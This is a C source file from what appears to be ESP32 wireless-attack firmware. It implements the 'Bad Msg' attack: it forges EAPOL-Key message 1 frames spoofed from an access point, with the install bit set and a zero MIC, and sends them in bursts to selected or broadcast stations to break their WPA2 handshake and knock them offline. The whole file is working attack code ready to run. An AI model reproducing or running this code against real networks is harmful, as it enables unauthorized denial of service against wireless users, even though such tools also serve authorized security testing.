/**
 * @file bad_msg.c
 * @brief Bad Msg (EAPOL key install + zero MIC) attack implementation
 *
 * Sends forged EAPOL-Key message 1 frames with the install bit set and a
 * zero MIC from the selected AP(s) to their stations. Vulnerable stations
 * install the pairwise key prematurely, aborting the 4-way handshake and
 * dropping the connection. Ported from the ESP32Marauder Bad Msg attack.
 *
 * Note: This module interfaces with wifi_manager.c for shared state
 * and WiFi control functions.
 */

#include "attacks/wifi/bad_msg.h"
#include "managers/wifi_manager.h"
#include "managers/ap_manager.h"
#include "managers/status_display_manager.h"
#include "managers/ghostscript_runtime.h"
#include "core/system_manager.h"
#include "core/glog.h"
#include "core/network_constants.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include <stdio.h>
#include <string.h>
#include <inttypes.h>

// External globals from wifi_manager.c
extern wifi_ap_record_t selected_ap;
extern wifi_ap_record_t *selected_aps;
extern int selected_ap_count;
extern wifi_ap_record_t *scanned_aps;
extern uint16_t ap_count;
extern station_ap_pair_t station_ap_list[MAX_STATIONS];
extern int station_count;
extern bool station_selected;
extern station_ap_pair_t selected_station;

// Module state
static volatile bool bad_msg_running = false;
static volatile uint32_t bad_msg_packets_sent = 0;
static TaskHandle_t bad_msg_task_handle = NULL;

// 24-byte 802.11 header + 8 LLC/SNAP + 4 EAPOL header
#define BAD_MSG_HEADER_LEN 36
// EAPOL-Key message 1 body (RSN/CCMP)
#define BAD_MSG_KEY_LEN 95
#define BAD_MSG_FRAME_LEN (BAD_MSG_HEADER_LEN + BAD_MSG_KEY_LEN)

// Data frame (FromDS) + LLC/SNAP + EAPOL-Key header. Addresses, sequence
// and the key body are filled per frame.
static const uint8_t bad_msg_header[BAD_MSG_HEADER_LEN] = {
    0x08, 0x02,                         // Frame Control: Data, FromDS=1
    0x00, 0x00,                         // Duration
    // addr1 (station), addr2 (AP), addr3 (BSSID) placeholders
    0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,0,0,0,0,
    0x00, 0x00,                         // SeqCtrl
    // LLC/SNAP + EAPOL ethertype
    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E,
    // EAPOL header: version 2, type Key(3), length 95
    0x02, 0x03, 0x00, 0x5F,
};

// Offsets into the 95-byte EAPOL-Key body
enum {
    KEY_OFF_DESCRIPTOR = 0,
    KEY_OFF_KEY_INFO   = 1,
    KEY_OFF_KEY_LEN    = 3,
    KEY_OFF_REPLAY     = 5,
    KEY_OFF_NONCE      = 13,
    KEY_OFF_IV         = 45,
    KEY_OFF_RSC        = 61,
    KEY_OFF_ID         = 69,
    KEY_OFF_MIC        = 77,
    KEY_OFF_DATA_LEN   = 93,
};

// Helper to sanitize SSID for logging
static void sanitize_ssid(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size) {
    char temp_ssid[33];
    memcpy(temp_ssid, input_ssid, 32);
    temp_ssid[32] = '\0';
    if (strlen(temp_ssid) == 0) {
        snprintf(output_buffer, buffer_size, "[Hidden]");
    } else {
        snprintf(output_buffer, buffer_size, "%s", temp_ssid);
    }
}

// Build one Bad Msg frame: EAPOL-Key M1 spoofed from the AP to a station,
// pairwise install bit set, zero MIC. Returns the frame length.
static uint16_t build_bad_msg_frame(uint8_t *frame, const uint8_t *ap_bssid, const uint8_t *sta_mac) {
    memcpy(frame, bad_msg_header, BAD_MSG_HEADER_LEN);
    memcpy(&frame[4], sta_mac, 6);      // addr1: station
    memcpy(&frame[10], ap_bssid, 6);    // addr2: AP
    memcpy(&frame[16], ap_bssid, 6);    // addr3: BSSID

    uint16_t seq = (esp_random() & 0xFFF) << 4;
    frame[22] = seq & 0xFF;
    frame[23] = (seq >> 8) & 0xFF;

    uint8_t *key = &frame[BAD_MSG_HEADER_LEN];
    key[KEY_OFF_DESCRIPTOR] = 0x02;         // RSN (WPA2)
    key[KEY_OFF_KEY_INFO] = 0xCA;           // ver 2 | pairwise | install | ack
    key[KEY_OFF_KEY_INFO + 1] = 0x00;
    key[KEY_OFF_KEY_LEN] = 0x10;            // key length: 16 (CCMP)
    key[KEY_OFF_KEY_LEN + 1] = 0x00;
    // Randomize replay counter, nonce, IV, RSC and key ID
    esp_fill_random(&key[KEY_OFF_REPLAY], 8 + 32 + 16 + 8 + 8);
    // Zero MIC - the install bit makes vulnerable stacks act before MIC check
    memset(&key[KEY_OFF_MIC], 0, 16);
    key[KEY_OFF_DATA_LEN] = 0x00;           // no key data
    key[KEY_OFF_DATA_LEN + 1] = 0x00;

    return BAD_MSG_FRAME_LEN;
}

// Send a burst of Bad Msg frames from an AP to one station MAC on the AP channel
static void bad_msg_burst(const uint8_t *ap_bssid, int channel, const uint8_t *sta_mac) {
    // Static frame buffer: single task instance, no per-call stack cost
    static uint8_t frame[BAD_MSG_FRAME_LEN];
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    uint16_t len = build_bad_msg_frame(frame, ap_bssid, sta_mac);
    for (int burst = 0; burst < 10 && bad_msg_running; burst++) {
        if (esp_wifi_80211_tx(ap_manager_get_tx_iface(), frame, len, false) == ESP_OK) {
            bad_msg_packets_sent++;
        }
    }
}

// Attack all known stations on one AP; fall back to broadcast when no
// stations have been discovered for it.
static void bad_msg_attack_ap(const uint8_t *ap_bssid, int channel) {
    bool sent_any = false;
    for (int j = 0; j < station_count; j++) {
        if (memcmp(station_ap_list[j].ap_bssid, ap_bssid, 6) == 0) {
            bad_msg_burst(ap_bssid, channel, station_ap_list[j].station_mac);
            sent_any = true;
            vTaskDelay(pdMS_TO_TICKS(5));
        }
    }
    if (!sent_any) {
        static uint32_t last_warning_time = 0;
        uint32_t current_time = xTaskGetTickCount();
        if (current_time - last_warning_time > pdMS_TO_TICKS(5000)) {
            glog("no stations found for this ap.\nbad msg is more effective with discovered stations\n");
            last_warning_time = current_time;
        }
        uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        bad_msg_burst(ap_bssid, channel, broadcast_mac);
    }
}

static void bad_msg_task(void *param) {
    (void)param;
    TickType_t last_log_tick = xTaskGetTickCount();
    uint32_t last_log_total = 0;

    while (bad_msg_running) {
        if (station_selected) {
            // Target the selected station's AP only
            int ch = 1;
            for (int i = 0; i < ap_count; i++) {
                if (memcmp(scanned_aps[i].bssid, selected_station.ap_bssid, 6) == 0) {
                    ch = scanned_aps[i].primary;
                    break;
                }
            }
            bad_msg_burst(selected_station.ap_bssid, ch, selected_station.station_mac);
            vTaskDelay(pdMS_TO_TICKS(10));
        } else if (selected_ap_count > 0 && selected_aps != NULL) {
            // Attack all stations on every selected AP
            for (int i = 0; i < selected_ap_count; i++) {
                if (!bad_msg_running) break;
                bad_msg_attack_ap(selected_aps[i].bssid, selected_aps[i].primary);
                vTaskDelay(pdMS_TO_TICKS(10));
            }
        } else if (strlen((const char *)selected_ap.ssid) > 0) {
            // Attack all stations on the single selected AP
            bad_msg_attack_ap(selected_ap.bssid, selected_ap.primary);
            vTaskDelay(pdMS_TO_TICKS(10));
        } else {
            glog("no ap or station selected for bad msg\n");
            bad_msg_running = false;
            break;
        }

        TickType_t now = xTaskGetTickCount();
        if ((now - last_log_tick) >= pdMS_TO_TICKS(5000)) {
            uint32_t total = bad_msg_packets_sent;
            uint32_t interval = total - last_log_total;
            last_log_total = total;
            last_log_tick = now;
            uint32_t pps = interval / 5;
            glog("Bad Msg: %lu/sec | Total: %lu\n", (unsigned long)pps, (unsigned long)total);
        }
    }
    bad_msg_task_handle = NULL;
    vTaskDeleteWithCaps(NULL);
}

void bad_msg_start(void) {
    if (bad_msg_running) {
        glog("Bad Msg already running\n");
        return;
    }

    // Validate target before starting
    if (!station_selected && selected_ap_count <= 0 && strlen((const char *)selected_ap.ssid) == 0) {
        glog("Bad Msg: No AP or station selected. Use 'select -a <index>' first.\n");
        return;
    }

    // Log target summary
    if (station_selected) {
        glog("Starting bad msg on station %02X:%02X:%02X:%02X:%02X:%02X (AP %02X:%02X:%02X:%02X:%02X:%02X)\n",
             selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2],
             selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5],
             selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2],
             selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
    } else if (selected_ap_count > 0 && selected_aps != NULL) {
        glog("Starting bad msg on %d selected APs:\n", selected_ap_count);
        for (int i = 0; i < selected_ap_count; i++) {
            char sanitized_ssid[33];
            sanitize_ssid(selected_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
            glog("  [%d] %s (%02X:%02X:%02X:%02X:%02X:%02X) ch %d\n",
                 i, sanitized_ssid,
                 selected_aps[i].bssid[0], selected_aps[i].bssid[1], selected_aps[i].bssid[2],
                 selected_aps[i].bssid[3], selected_aps[i].bssid[4], selected_aps[i].bssid[5],
                 selected_aps[i].primary);
        }
    } else {
        char sanitized_ssid[33];
        sanitize_ssid(selected_ap.ssid, sanitized_ssid, sizeof(sanitized_ssid));
        glog("Starting bad msg on: %s (ch %d)\n", sanitized_ssid, selected_ap.primary);
    }

    // Attack radio profile tears down the GhostNet AP (kicking any WebUI
    // client) and injects from the STA interface, keeping the radio free for
    // channel hopping.
    ap_manager_stop_services();
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(50));

    ESP_ERROR_CHECK(ap_manager_apply_attack_radio());

    bad_msg_running = true;
    bad_msg_packets_sent = 0;
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_attack("Bad Msg", "running");
#endif
    ghostscript_emit_event("attack_started", "bad_msg");
    BaseType_t attack_rc = xTaskCreate_psram(bad_msg_task, "bad_msg", 4096, NULL, 5, &bad_msg_task_handle);
    if (attack_rc != pdPASS) {
        glog("Bad Msg failed to start (attack=%ld)\n", (long)attack_rc);
        bad_msg_running = false;
        if (bad_msg_task_handle) {
            vTaskDeleteWithCaps(bad_msg_task_handle);
            bad_msg_task_handle = NULL;
        }
        esp_wifi_stop();
        (void)ap_manager_restore_after_attack("bad msg start");
#ifdef CONFIG_WITH_STATUS_DISPLAY
        status_display_show_status("Bad Msg failed");
#endif
        return;
    }
    glog("Bad Msg running. Use 'stopdeauth' or 'stop' to end.\n");
}

void bad_msg_stop(void) {
    if (!bad_msg_running && bad_msg_task_handle == NULL) {
        return;
    }

    bad_msg_running = false;

    // Wait for the task to finish gracefully before force deletion
    int wait_count = 0;
    while (bad_msg_task_handle != NULL && wait_count < 100) {
        vTaskDelay(pdMS_TO_TICKS(10));
        wait_count++;
    }

    if (bad_msg_task_handle) {
        TaskHandle_t temp_handle = bad_msg_task_handle;
        bad_msg_task_handle = NULL;
        vTaskDeleteWithCaps(temp_handle);
    }

    esp_wifi_stop();
    (void)ap_manager_restore_after_attack("bad msg stop");

    glog("Bad Msg stopped. Total: %lu packets\n", (unsigned long)bad_msg_packets_sent);
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_status("Bad Msg stopped");
#endif
    ghostscript_emit_event("attack_stopped", "bad_msg");
}

bool bad_msg_is_running(void) {
    return bad_msg_running;
}
